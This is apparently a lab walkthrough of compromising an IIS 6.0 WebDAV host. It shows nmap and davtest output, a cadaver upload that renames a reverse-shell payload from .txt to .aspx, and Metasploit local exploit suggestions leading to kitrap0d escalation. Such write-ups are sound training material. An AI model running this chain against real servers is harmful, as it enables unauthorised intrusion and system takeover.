## Nmap Port Scanning
- <mark>Basic Scan</mark>
	``` bash
	┌──(saxon㉿Saxon)-[~/Desktop]
	└─$ nmap -Pn -sV -sC -T4 10.10.10.15 -p 80
	Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-02 21:47 EDT
	Nmap scan report for 10.10.10.15
	Host is up (0.023s latency).
	
	PORT   STATE SERVICE VERSION
	80/tcp open  http    Microsoft IIS httpd 6.0
	|_http-server-header: Microsoft-IIS/6.0
	|_http-title: Under Construction
	| http-webdav-scan: 
	|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
	|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
	|   WebDAV type: Unknown
	|   Server Date: Sun, 03 Sep 2023 01:47:46 GMT
	|_  Server Type: Microsoft-IIS/6.0
	| http-methods: 
	|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 11.58 seconds
	```
#### 80/tcp open Microsoft IIS httpd 6.0
- According to nmap scan, the webserver has potentially WebDAV enabled. Let's run davtest to confirm what file extension is allowed to be uploaded.
	```bash
	┌──(saxon㉿Saxon)-[~/Desktop]
	└─$ davtest --url http://10.10.10.15 -cleanup
	********************************************************
	 Testing DAV connection
	OPEN            SUCCEED:                http://10.10.10.15                                                                                                                                        
	********************************************************                                                                                                                                          
	NOTE    Random string for this session: aftpDe                                                                                                                                                    
	********************************************************                                                                                                                                          
	 Creating directory                                                                                                                                                                               
	MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_aftpDe                                                                                                              
	********************************************************
	 Sending test files
	PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_aftpDe/davtest_aftpDe.html
	PUT     asp     FAIL
	PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_aftpDe/davtest_aftpDe.php
	PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_aftpDe/davtest_aftpDe.pl
	PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_aftpDe/davtest_aftpDe.jsp
	PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_aftpDe/davtest_aftpDe.cfm
	PUT     shtml   FAIL
	PUT     aspx    FAIL
	PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_aftpDe/davtest_aftpDe.txt
	PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_aftpDe/davtest_aftpDe.jhtml
	PUT     cgi     FAIL
	********************************************************
	 Checking for test file execution
	EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_aftpDe/davtest_aftpDe.html
	EXEC    html    FAIL
	EXEC    php     FAIL
	EXEC    pl      FAIL
	EXEC    jsp     FAIL
	EXEC    cfm     FAIL
	EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_aftpDe/davtest_aftpDe.txt
	EXEC    txt     FAIL
	EXEC    jhtml   FAIL
	
	********************************************************
	/usr/bin/davtest Summary:
	Created: http://10.10.10.15/DavTestDir_aftpDe
	PUT File: http://10.10.10.15/DavTestDir_aftpDe/davtest_aftpDe.html
	PUT File: http://10.10.10.15/DavTestDir_aftpDe/davtest_aftpDe.php
	PUT File: http://10.10.10.15/DavTestDir_aftpDe/davtest_aftpDe.pl
	PUT File: http://10.10.10.15/DavTestDir_aftpDe/davtest_aftpDe.jsp
	PUT File: http://10.10.10.15/DavTestDir_aftpDe/davtest_aftpDe.cfm
	PUT File: http://10.10.10.15/DavTestDir_aftpDe/davtest_aftpDe.txt
	PUT File: http://10.10.10.15/DavTestDir_aftpDe/davtest_aftpDe.jhtml
	Executes: http://10.10.10.15/DavTestDir_aftpDe/davtest_aftpDe.html
	Executes: http://10.10.10.15/DavTestDir_aftpDe/davtest_aftpDe.txt
	```
	- Unfortunately, .aspx is not allowed to be upload but .txt is allowed. <mark>We can first upload payload as it in .txt extension and change back to .aspx with MOVE method that WebDAV supports.</mark>
- <mark>Exploitation</mark>
	- Upload payload in .txt extension with `PUT` and change to .aspx extension with `MOVE`.
	```bash
	┌──(saxon㉿Saxon)-[~/Desktop]
	└─$ cadaver 10.10.10.15
	dav:/> put reverse.txt 
	Uploading reverse.txt to `/reverse.txt `:
	Progress: [=============================>] 100.0% of 2866 bytes succeeded.
	dav:/> mv reverse.txt reverse.aspx 
	Moving `/reverse.txt' to `/reverse.aspx':  succeeded.	
```
	- Set up listener in Metasploit and navigate to `http://10.10.10.15/reverse.aspx` to trigger the payload.
- <mark>Post-Exploitation</mark>
```bash
msf6 post(multi/recon/local_exploit_suggester) > run
[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 184 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
# Escalation  
exploit/windows/local/ms10_015_kitrap0d
```